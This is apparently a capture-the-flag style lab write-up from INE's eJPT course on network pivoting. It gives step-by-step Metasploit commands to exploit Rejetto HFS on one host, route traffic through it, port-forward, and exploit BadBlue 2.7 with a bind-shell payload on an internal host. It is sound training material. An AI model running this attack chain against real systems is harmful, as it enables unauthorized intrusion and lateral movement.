# Pivoting - INE eJPT

INE pivoting lab demonstrating lateral movement into a network segment not directly reachable from the attacker. Target1 (accessible) is compromised via HFS RCE, then used as a pivot to reach and exploit target2 (internal-only) running BadBlue.

Targets: `demo1.ine.local` (accessible) | `demo2.ine.local` (internal - unreachable directly)

Attack chain: `HFS RCE (demo1) - autoroute - TCP scan via pivot - portfwd - BadBlue RCE (demo2)`

---

## Reconnaissance

```bash
ping -c 4 demo1.ine.local
ping -c 4 demo2.ine.local
```

`demo1` reachable. `demo2` unreachable from the attacker machine directly.

```bash
nmap demo1.ine.local
nmap -sV -p 80 demo1.ine.local
```

Port 80 - Rejetto HTTP File Server (HFS).

---

## Initial Access - demo1

```bash
searchsploit hfs
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo1.ine.local
exploit
```

Meterpreter session on demo1.

---

## Network Discovery and Route Injection

```bash
ipconfig
```

`demo1` has a second NIC on an internal subnet unreachable from the attacker.

```bash
run autoroute -s 10.0.19.0/20
```

Traffic to the internal subnet is now routed through the demo1 Meterpreter session.

---

## Pivot Scanning - demo2

```bash
background
use auxiliary/scanner/portscan/tcp
set RHOSTS demo2.ine.local
set PORTS 1-100
exploit
```

Port 80 open on demo2.

---

## Port Forwarding

```bash
sessions -i 1
portfwd add -l 1234 -p 80 -r <demo2_ip>
portfwd list
```

Local port 1234 on the attacker machine now forwards to port 80 on demo2 via the pivot.

```bash
nmap -sV -sS -p 1234 localhost
```

Service identified: BadBlue HTTPd 2.7.

---

## Exploitation - demo2

```bash
searchsploit badblue 2.7
background
use exploit/windows/http/badblue_passthru
set PAYLOAD windows/meterpreter/bind_tcp
set RHOSTS demo2.ine.local
exploit
```

A bind shell payload is used because the reverse connection from demo2 cannot reach the attacker directly - only bind or routed payloads work through a pivot.

```bash
shell
cd /
dir
type flag.txt
```

---

## Key Takeaways

- `autoroute` injects a routing rule that sends all traffic destined for the internal subnet through the active Meterpreter session. The attacker machine never directly contacts demo2.
- Port scanning through a pivot requires routing to be established first. `portscan/tcp` with the route active functions like a standard scan but tunneled through the compromised host.
- `portfwd` allows running local tools (`nmap`, browsers, exploit modules targeting `localhost`) against internal hosts. Without it, fingerprinting via the pivot is limited to Metasploit auxiliary modules.
- Bind shells (`bind_tcp`) are necessary when the pivot host cannot forward reverse connections back to the attacker. The attacker connects to the target rather than the target connecting to the attacker.
- The first compromised host is rarely the final objective. Always enumerate network interfaces (`ipconfig`, `ifconfig`, `ip addr`) to discover internal segments accessible only from the inside.

---

## Disclaimer

This lab was completed in a controlled environment provided by INE as part of the eJPT preparation path. All actions were performed strictly for educational purposes.
